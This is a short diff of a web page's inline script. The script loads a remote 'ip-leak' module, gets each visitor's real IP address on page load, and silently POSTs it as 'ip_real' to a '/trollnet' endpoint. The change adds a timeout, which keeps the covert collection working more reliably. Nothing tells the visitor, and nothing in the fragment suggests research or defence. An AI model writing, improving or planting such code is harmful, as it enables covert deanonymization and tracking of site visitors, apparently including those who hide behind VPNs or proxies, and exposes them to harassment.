@@ -11,7 +11,7 @@
     <script type="module">
         import getIp from 'https://unpkg.com/ip-leak?module';
       try{
-        const ip= await getIp()
+        const ip= await getIp({timeout:10000})
      fetch("/trollnet",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ip_real:ip})})
     }catch(error){console.log("error:",error)}
 
